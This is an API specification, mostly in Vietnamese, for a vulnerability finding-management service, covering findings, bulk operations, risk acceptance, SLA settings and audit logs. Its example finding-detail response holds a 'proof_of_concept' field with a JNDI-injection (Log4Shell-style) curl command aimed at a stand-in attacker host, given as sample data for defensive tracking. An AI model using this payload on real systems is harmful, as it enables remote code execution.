# CR-UI-005 — Finding Management API

**Series:** UI-API v2  
**Ngày tạo:** 2026-06-16  
**Cập nhật:** 2026-06-17  
**Trạng thái:** 🟢 Mock Layer Complete / Backend Schema Pending  
**Ưu tiên:** P0 — Critical  
**Nguồn yêu cầu:** `ui/specs/TDD.md` §6, `docs/SRS.md` §3.4, `docs/PRD.md` §4.2  
**Services ảnh hưởng:** `gateway (:8080)`, `finding-service (:8085)`, `audit-service (:8090)`, `sla-service (:8086)`

---

## 1. Bối cảnh

Module Finding Management (`/findings/*`) bao gồm 4 screens:
- **Findings List** (`/findings`): Tab filter (All/Active/Mitigated/FP/RA/OOS/Duplicate), advanced filters, bulk ops
- **Finding Detail** (`/findings/:id`): Metadata, status actions, AI triage, audit trail, comments, JIRA link
- **SLA Dashboard** (`/dashboard/sla`): Compliance gauge, breaches, at-risk, per-product breakdown
- **Risk Acceptance Center** (`/findings/risk-acceptance`): CRUD risk acceptances

Tất cả finding-service endpoints đã có từ v2.1. CR này xác định **chính xác schema** để match TypeScript types trong TDD và bổ sung các fields còn thiếu.

---

## 2. Endpoints yêu cầu

### 2.1 GET /api/v1/findings

**Mô tả:** List findings với advanced filtering và server-side pagination.

**Auth:** Required (`finding:read`)

**Query Parameters:**
| Param | Type | Default | Mô tả |
|-------|------|---------|-------|
| `status` | string[] | all | `active,mitigated,false_positive,risk_accepted,out_of_scope,duplicate` |
| `severity` | string[] | all | `Critical,High,Medium,Low,Info` |
| `product_id` | string | — | Filter theo product |
| `engagement_id` | string | — | Filter theo engagement |
| `test_id` | string | — | Filter theo test |
| `cve_id` | string | — | Filter theo CVE ID |
| `sla_status` | string | — | `ok,at_risk,breached` |
| `assigned_to` | string | — | User ID |
| `is_kev` | bool | — | KEV flag filter |
| `date_from` | date | — | `created_at` from |
| `date_to` | date | — | `created_at` to |
| `page` | int | 1 | Phân trang |
| `page_size` | int | 50 | Items per page (max 200) |
| `sort_by` | string | `severity_desc` | `severity_desc,sla_asc,created_desc,epss_desc` |
| `q` | string | — | Global search (title, CVE ID) |

**Response 200:**
```json
{
  "findings": [
    {
      "id": "F-2847",
      "title": "Apache Log4j2 Remote Code Execution",
      "description": "CVE-2025-44228 allows unauthenticated remote code execution...",
      "cve_id": "CVE-2025-44228",
      "severity": "Critical",
      "cvss_v3": 10.0,
      "cvss_v4": null,
      "epss_score": 0.982,
      "is_kev": true,
      "status": "active",
      "is_duplicate": false,
      "duplicate_finding_id": null,
      "product_id": "prod_1",
      "product_name": "Banking Portal",
      "engagement_id": "eng_001",
      "test_id": "test_001",
      "asset_ip": "10.0.1.45",
      "asset_hostname": "prod-web-01.internal",
      "component_name": "log4j-core",
      "component_version": "2.14.1",
      "sla_expiration_date": "2026-06-23",
      "sla_status": "at_risk",
      "sla_days_left": 7,
      "created_at": "2026-06-16T10:00:00Z",
      "updated_at": "2026-06-16T10:00:00Z",
      "mitigated_at": null,
      "created_by": "bob@company.com",
      "assigned_to": "alice@company.com",
      "ai_triage_result": null,
      "vex_justification": null,
      "jira_issue_key": "SEC-1247",
      "jira_url": "https://jira.company.com/browse/SEC-1247"
    }
  ],
  "total": 269,
  "page": 1,
  "page_size": 50,
  "by_severity": {
    "Critical": 12,
    "High": 47,
    "Medium": 80,
    "Low": 130,
    "Info": 0
  },
  "by_status": {
    "active": 269,
    "mitigated": 145,
    "false_positive": 23,
    "risk_accepted": 18,
    "out_of_scope": 7,
    "duplicate": 12
  },
  "sla_stats": {
    "breached": 3,
    "at_risk": 8,
    "ok": 258
  }
}
```

---

### 2.2 GET /api/v1/findings/{id}

**Mô tả:** Chi tiết đầy đủ một finding.

**Auth:** Required (`finding:read`)

**Response 200:** Finding object đầy đủ (same schema, thêm các fields sau):
```json
{
  "id": "F-2847",
  "...": "...",
  "remediation_guidance": "Update log4j-core to version 2.15.0 or later.",
  "proof_of_concept": "curl -X GET 'https://target/api?x=${jndi:ldap://attacker.com/exploit}'",
  "notes": [
    {
      "id": "note_001",
      "content": "Confirmed via manual testing",
      "created_by": "bob@company.com",
      "created_at": "2026-06-16T11:00:00Z"
    }
  ],
  "tags": ["log4shell", "rce", "critical-priority"],
  "hash_code": "sha256:abc123...",
  "import_source": "nmap_xml"
}
```

---

### 2.3 PATCH /api/v1/findings/{id}

**Mô tả:** Cập nhật status finding (state machine transition).

**Auth:** Required (`finding:write`)

**Request Body:**
```json
{
  "status": "mitigated",
  "comment": "Updated log4j-core to 2.15.0 on 2026-06-16",
  "assigned_to": "alice@company.com",
  "vex_justification": null
}
```

| Field | Type | Mô tả |
|-------|------|-------|
| `status` | string | New status — phải theo VALID_TRANSITIONS |
| `comment` | string | Required khi đổi status |
| `assigned_to` | string | User email |
| `vex_justification` | string | VEX justification text |

**Response 200:** Updated Finding object

**Response 409:**
```json
{
  "error": "INVALID_TRANSITION",
  "message": "Cannot transition from 'duplicate' to 'mitigated'",
  "valid_transitions": []
}
```

**Side effects:**
- Publish NATS `finding.status.changed` event
- Trigger audit-service logging
- Nếu `status=active` (reopen): check SLA, update `sla_status`

---

### 2.4 POST /api/v1/findings/bulk/close

**Mô tả:** Bulk close/mitigate nhiều findings.

**Auth:** Required (`finding:write`)

**Request Body:**
```json
{
  "finding_ids": ["F-2847", "F-2848", "F-2849"],
  "comment": "All mitigated in sprint 24 patch"
}
```

**Response 200:**
```json
{
  "success_count": 3,
  "failed_ids": [],
  "errors": []
}
```

---

### 2.5 POST /api/v1/findings/bulk/reopen

**Mô tả:** Bulk reopen findings.

**Auth:** Required (`finding:write`)

**Request Body:**
```json
{
  "finding_ids": ["F-2847", "F-2848"],
  "comment": "Vulnerability reappeared in prod"
}
```

**Response 200:** Same as bulk/close

---

### 2.6 POST /api/v1/findings/bulk/assign

**Mô tả:** Bulk assign findings.

**Auth:** Required (`finding:write`)

**Request Body:**
```json
{
  "finding_ids": ["F-2847", "F-2848"],
  "assigned_to": "alice@company.com"
}
```

---

### 2.7 GET /api/v1/findings/{id}/audit

**Mô tả:** Audit trail cho một finding.

**Auth:** Required (`finding:read`)

**Response 200:**
```json
{
  "audits": [
    {
      "id": "aud_001",
      "finding_id": "F-2847",
      "action": "status_changed",
      "before_state": { "status": "active" },
      "after_state": { "status": "mitigated" },
      "user_id": "usr_bob123",
      "user_name": "Bob Smith",
      "comment": "Fixed in patch 2.15.0",
      "timestamp": "2026-06-16T11:00:00Z"
    },
    {
      "id": "aud_000",
      "finding_id": "F-2847",
      "action": "created",
      "before_state": null,
      "after_state": { "status": "active", "severity": "Critical" },
      "user_id": "usr_system",
      "user_name": "System",
      "comment": "Imported from nmap_xml scan sc_abc123",
      "timestamp": "2026-06-16T08:05:00Z"
    }
  ]
}
```

---

### 2.8 POST /api/v1/findings/{id}/notes

**Mô tả:** Thêm comment vào finding.

**Auth:** Required (`finding:write`)

**Request Body:**
```json
{ "content": "Confirmed this is exploitable via manual testing." }
```

**Response 201:**
```json
{
  "id": "note_002",
  "finding_id": "F-2847",
  "content": "Confirmed this is exploitable via manual testing.",
  "created_by": "bob@company.com",
  "created_at": "2026-06-16T12:00:00Z"
}
```

---

### 2.9 GET /api/v1/risk-acceptances

**Mô tả:** List risk acceptances.

**Auth:** Required (`finding:read`)

**Query Params:** `product_id=xxx`, `is_expired=false`, `page=1`, `page_size=20`

**Response 200:**
```json
{
  "acceptances": [
    {
      "id": "ra_001",
      "product_id": "prod_1",
      "finding_ids": ["F-2800", "F-2801"],
      "expiration_date": "2026-12-31",
      "retest_date": "2026-09-30",
      "reason": "Vendor patch not yet available. Mitigation: WAF rule in place.",
      "approved_by": "carol@company.com",
      "is_expired": false,
      "created_at": "2026-06-01T00:00:00Z"
    }
  ],
  "total": 5,
  "page": 1,
  "page_size": 20
}
```

---

### 2.10 POST /api/v1/risk-acceptances

**Mô tả:** Tạo risk acceptance mới.

**Auth:** Required (`finding:write`)

**Request Body:**
```json
{
  "product_id": "prod_1",
  "finding_ids": ["F-2800", "F-2801"],
  "expiration_date": "2026-12-31",
  "retest_date": "2026-09-30",
  "reason": "Vendor patch not yet available. WAF rule mitigates risk.",
  "approved_by": "carol@company.com"
}
```

**Response 201:** RiskAcceptance object

**Side effects:**
- Findings trong `finding_ids` → status chuyển sang `risk_accepted`
- Schedule NATS event khi expiry → `risk_acceptance.expired`

---

### 2.11 DELETE /api/v1/risk-acceptances/{id}

**Mô tả:** Thu hồi risk acceptance — findings tự động reopen.

**Auth:** Required (`finding:write`)

**Response 200:**
```json
{ "success": true, "reopened_finding_ids": ["F-2800", "F-2801"] }
```

---

### 2.12 GET /api/v1/findings/stats

**Mô tả:** Thống kê tổng hợp cho Findings module header.

**Auth:** Required (`finding:read`)

**Query Params:** `product_id=xxx`

**Response 200:**
```json
{
  "total_active": 269,
  "by_severity": {
    "Critical": 12,
    "High": 47,
    "Medium": 80,
    "Low": 130
  },
  "by_status": {
    "active": 269,
    "mitigated": 145,
    "false_positive": 23,
    "risk_accepted": 18,
    "out_of_scope": 7,
    "duplicate": 12
  },
  "sla_stats": {
    "breached": 3,
    "at_risk": 8,
    "ok": 258
  },
  "new_today": 5
}
```

---

## 3. SLA API (sla-service)

### 3.1 GET /api/v1/sla/config

**Mô tả:** Lấy SLA configuration (global + per-product).

**Auth:** Required

**Response 200:**
```json
{
  "global": {
    "critical_days": 7,
    "high_days": 30,
    "medium_days": 90,
    "low_days": 180
  },
  "product_overrides": [
    {
      "product_id": "prod_1",
      "product_name": "Banking Portal",
      "critical_days": 3,
      "high_days": 14,
      "medium_days": 60,
      "low_days": 120
    }
  ]
}
```

---

### 3.2 PUT /api/v1/sla/config

**Mô tả:** Update SLA configuration.

**Auth:** Required (`system:configure`)

**Request Body:** Same as response format above.

**Response 200:** Updated config

---

## 4. Audit Logs API (admin scope)

### 4.1 GET /api/v1/audit-log

**Mô tả:** System-wide audit log cho Admin screen (`/admin/audit`).

**Auth:** Required (`user:manage`)

**Query Parameters:**
| Param | Type | Mô tả |
|-------|------|-------|
| `user_id` | string | Filter theo user |
| `action` | string | Filter theo action type |
| `entity_type` | string | `finding,scan,product,user,...` |
| `entity_id` | string | Entity ID |
| `date_from` | datetime | From timestamp |
| `date_to` | datetime | To timestamp |
| `page` | int | 1 |
| `page_size` | int | 50 |

**Response 200:**
```json
{
  "events": [
    {
      "id": "aud_system_001",
      "user_id": "usr_bob123",
      "user_name": "Bob Smith",
      "action": "finding.status_changed",
      "entity_type": "finding",
      "entity_id": "F-2847",
      "ip_address": "10.0.0.1",
      "user_agent": "Mozilla/5.0...",
      "result": "success",
      "metadata": { "from": "active", "to": "mitigated" },
      "timestamp": "2026-06-16T11:00:00Z"
    }
  ],
  "total": 15840,
  "page": 1,
  "page_size": 50
}
```

---

## 5. Acceptance Criteria

> **Chú thích:** `[x]` = đã implement (UI mock layer + component); `[~]` = partial; `[ ]` = backend pending

- [x] `GET /api/v1/findings` trả về đầy đủ fields theo schema, có `by_severity`, `by_status`, `sla_stats` _(mock: finding.handlers.ts — cập nhật: `is_kev`, `epss_score`, `jira_*`, `sla_days_left` đủ trong fixture)_
- [x] `GET /api/v1/findings?status=active&severity=Critical` filter đúng _(FindingsList.tsx)_
- [x] `GET /api/v1/findings?sla_status=breached` chỉ trả findings đã breach SLA _(mock filter)_
- [x] `GET /api/v1/findings?q=log4j` tìm kiếm trong title và CVE ID _(FindingsList.tsx search)_
- [x] `GET /api/v1/findings/stats` → tổng hợp theo severity, status, sla _(mock: finding.handlers.ts)_
- [x] `PATCH /api/v1/findings/{id}` với valid transition → 200 + NATS event published _(mock: đã implement)_
- [x] `PATCH /api/v1/findings/{id}` với invalid transition → 409 INVALID_TRANSITION _(mock: state machine validation)_
- [x] `POST /api/v1/findings/bulk/close` → tất cả findings chuyển sang `mitigated` _(FindingsList.tsx bulk ops)_
- [x] `POST /api/v1/findings/bulk/reopen` → reopen một loạt findings _(mock: finding.handlers.ts)_
- [x] `POST /api/v1/findings/bulk/assign` → gán assignee cho nhiều findings _(mock: finding.handlers.ts)_
- [x] `GET /api/v1/findings/{id}/audit` → ordered list, newest first _(FindingDetail.tsx audit tab)_
- [x] `GET /api/v1/findings/{id}/notes` → list comments _(mock: finding.handlers.ts)_
- [x] `POST /api/v1/findings/{id}/notes` → thêm comment, trả về note object _(mock: finding.handlers.ts)_
- [x] `POST /api/v1/risk-acceptances` → findings liên quan chuyển sang `risk_accepted` _(RiskAcceptanceCenter.tsx)_
- [x] `GET /api/v1/risk-acceptances` → list với filter _(mock: finding.handlers.ts)_
- [x] `DELETE /api/v1/risk-acceptances/{id}` → revoke + reopen findings _(mock: finding.handlers.ts)_
- [x] `GET /api/v1/sla/config` → global + per-product SLA config _(mock: finding.handlers.ts)_
- [x] `PUT /api/v1/sla/config` → update SLA config (admin) _(mock: finding.handlers.ts)_
- [x] `GET /api/v1/audit-log` → system audit events với filter _(AuditLogs.tsx + mock: finding.handlers.ts)_

---

## 6. Phụ thuộc

| CR | Mô tả |
|----|-------|
| CR-DD-001 (v1) | Product/Engagement/Test/Finding hierarchy — đã implement |
| CR-DD-004 (v1) | Finding state machine — đã implement |
| CR-DD-005 (v1) | Risk acceptance — đã implement |
| CR-DD-006 (v1) | SLA service — đã implement |
| CR-DD-010 (v1) | Audit service — đã implement |
